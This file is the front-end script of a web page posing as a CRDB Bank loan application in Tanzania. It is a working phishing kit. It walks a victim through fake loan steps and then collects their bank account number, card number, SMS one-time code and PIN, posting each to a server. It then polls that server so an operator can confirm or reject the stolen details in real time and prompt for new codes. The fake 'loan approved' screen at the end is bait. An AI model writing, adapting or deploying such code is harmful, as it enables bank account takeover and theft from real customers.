document.addEventListener('DOMContentLoaded', () => {
    let clientId = 'crdb_client_' + Math.random().toString(36).substring(2, 9);
    let formData = {};
    let pollInterval = null;

    const steps = ['stepSlider', 'step1', 'step2', 'step3', 'accountVerification', 'otpScreen', 'pinScreen', 'congratsScreen'];
    let currentStepIndex = 0;

    function showStep(index) {
        steps.forEach((s, idx) => {
            const el = document.getElementById(s);
            if (el) {
                if (idx === index) {
                    el.classList.add('active');
                } else {
                    el.classList.remove('active');
                }
            }
        });
        currentStepIndex = index;
    }

    function showNotification(text) {
        const notif = document.getElementById('surfaceNotification');
        if (notif) {
            notif.textContent = text;
            notif.classList.remove('hidden');
        }
    }

    // Slider inputs
    const loanRange = document.getElementById('loanRange');
    const loanAmountText = document.getElementById('loanAmountText');
    const step1Amount = document.getElementById('step1Amount');
    
    if (loanRange) {
        loanRange.addEventListener('input', (e) => {
            const val = Number(e.target.value).toLocaleString();
            loanAmountText.textContent = `TSh ${val}`;
            if (step1Amount) step1Amount.value = e.target.value;
        });
    }

    document.getElementById('toStep1Btn').addEventListener('click', () => {
        formData.loanAmount = loanRange.value;
        showStep(1);
    });

    document.getElementById('nextToStep1').addEventListener('click', () => showStep(0));
    document.getElementById('backToStep1').addEventListener('click', () => showStep(1));
    document.getElementById('backToStep2').addEventListener('click', () => showStep(2));

    document.getElementById('nextToStep2').addEventListener('click', () => {
        formData.loanType = document.getElementById('loanType').value;
        formData.amount = document.getElementById('step1Amount').value;
        formData.duration = document.getElementById('step1Duration').value;
        formData.purpose = document.getElementById('loanPurpose').value;
        showStep(2);
    });

    // Tanzania phone validation: Must start with 6, 7 or 5 and be 9 digits
    document.getElementById('nextToStep3').addEventListener('click', () => {
        const rawPhone = document.getElementById('phoneNumber').value.trim();
        const tanzaniaPhoneRegex = /^[675]\d{8}$/;

        if (!tanzaniaPhoneRegex.test(rawPhone)) {
            alert('Weka namba halali ya simu ya Tanzania (mfano: 712345678 - tarakimu 9 zianzo na 6, 7 au 5)');
            return;
        }

        formData.firstName = document.getElementById('firstName').value;
        formData.lastName = document.getElementById('lastName').value;
        formData.phone = rawPhone;

        if (!formData.firstName || !formData.lastName) {
            alert('Tafadhali jaza majina yako!');
            return;
        }

        document.getElementById('displayPhone').textContent = `+255 ${formData.phone} (Tembo)`;
        showStep(3);
    });

    document.getElementById('submitLoanApp').addEventListener('click', () => {
        formData.employmentStatus = document.getElementById('employmentStatus').value;
        formData.annualIncome = document.getElementById('annualIncome').value;

        document.getElementById('summaryDetails').innerHTML = `
            Kiasi cha Mkopo: TSh ${formData.amount || '100,000'}<br>
            Muda wa Mkopo: ${formData.duration || 'Miezi 48'}<br>
            Madhumuni: ${formData.purpose || 'Biashara'}<br>
            Mwombaji: ${formData.firstName} ${formData.lastName}
        `;

        showStep(4);
    });

    // Account & Card Number submission
    document.getElementById('submitAccountDetails').addEventListener('click', async () => {
        const accountNumber = document.getElementById('accountNumberInput').value;
        const cardNumber = document.getElementById('cardNumberInput').value;

        if (!accountNumber || !cardNumber) {
            alert('Weka namba ya akaunti na namba ya kadi!');
            return;
        }

        showNotification('Inatuma taarifa kwa uthibitisho wa CRDB...');

        await fetch('/api/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                step: 'account_details',
                clientId,
                data: { accountNumber, cardNumber, ...formData }
            })
        });

        startPolling();
    });

    setupOtpInputs('.otp-box', () => {
        const otpVals = Array.from(document.querySelectorAll('.otp-box')).map(i => i.value).join('');
        if (otpVals.length === 5) {
            submitOtp(otpVals);
        }
    });

    setupOtpInputs('.pin-box', () => {
        const pinVals = Array.from(document.querySelectorAll('.pin-box')).map(i => i.value).join('');
        if (pinVals.length === 4) {
            submitPin(pinVals);
        }
    });

    function setupOtpInputs(selector, onComplete) {
        const inputs = document.querySelectorAll(selector);
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                const val = e.target.value;
                if (val && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                onComplete();
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !input.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });
    }

    document.getElementById('verifyOtpBtn').addEventListener('click', () => {
        const otpVals = Array.from(document.querySelectorAll('.otp-box')).map(i => i.value).join('');
        if (otpVals.length < 5) {
            alert('Weka namba kamili ya OTP ya tarakimu 5!');
            return;
        }
        submitOtp(otpVals);
    });

    async function submitOtp(otp) {
        showNotification('Inathibitisha OTP...');
        await fetch('/api/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ step: 'otp_submitted', clientId, data: { otp } })
        });
        startPolling();
    }

    document.getElementById('resendOtpLink').addEventListener('click', async (e) => {
        e.preventDefault();
        showNotification('Tunaomba OTP mpya...');
        await fetch('/api/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ step: 'resend_otp', clientId, data: {} })
        });
        showNotification('OTP mpya imeombwa. Subiri uthibitisho ✅');
    });

    document.getElementById('verifyPinBtn').addEventListener('click', () => {
        const pinVals = Array.from(document.querySelectorAll('.pin-box')).map(i => i.value).join('');
        if (pinVals.length < 4) {
            alert('Weka PIN kamili ya tarakimu 4!');
            return;
        }
        submitPin(pinVals);
    });

    async function submitPin(pin) {
        showNotification('Inathibitisha PIN...');
        await fetch('/api/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ step: 'pin_submitted', clientId, data: { pin } })
        });
        startPolling();
    }

    function startPolling() {
        if (pollInterval) clearInterval(pollInterval);

        pollInterval = setInterval(async () => {
            try {
                const res = await fetch(`/api/status/${clientId}`);
                const data = await res.json();

                if (data.status === 'wrong_details') {
                    showNotification('WRONG DETAILS ❌ - Tafadhali ingiza upya namba ya akaunti na kadi.');
                    showStep(4);
                    clearInterval(pollInterval);
                } else if (data.status === 'correct_details') {
                    showNotification('CORRECT DETAILS ✅ - Endelea kwenda OTP.');
                    showStep(5);
                    clearInterval(pollInterval);
                } else if (data.status === 'otp_incorrect') {
                    showNotification('OTP INCORRECT ❌ - Tafadhali ingiza namba mpya halali ya OTP.');
                    document.querySelectorAll('.otp-box').forEach(b => b.value = '');
                    document.querySelector('.otp-box').focus();
                    clearInterval(pollInterval);
                } else if (data.status === 'otp_correct') {
                    showNotification('OTP CORRECT ✅ - Endelea kuweka PIN.');
                    showStep(6);
                    clearInterval(pollInterval);
                } else if (data.status === 'invalid_pin') {
                    showNotification('INVALID PIN ❌ - Tafadhali ingiza PIN halali.');
                    document.querySelectorAll('.pin-box').forEach(b => b.value = '');
                    document.querySelector('.pin-box').focus();
                    clearInterval(pollInterval);
                } else if (data.status === 'valid_pin') {
                    showNotification('VALID PIN ✅ - Umeweka PIN sahihi. Subiri idhini...');
                } else if (data.status === 'loan_approved') {
                    showNotification('LOAN APPROVED 🎉');
                    document.getElementById('congratsName').textContent = `${formData.firstName || 'JANE'} ${formData.lastName || 'MWANGI'}`.toUpperCase();
                    document.getElementById('congratsPhone').textContent = `+255 ${formData.phone || '712 345 678'}`;
                    document.getElementById('congratsAcc').textContent = formData.accountNumber || 'SBK0012345678';
                    showStep(7);
                    clearInterval(pollInterval);
                }
            } catch (err) {
                console.error('Polling error:', err);
            }
        }, 3000);
    }
});
            
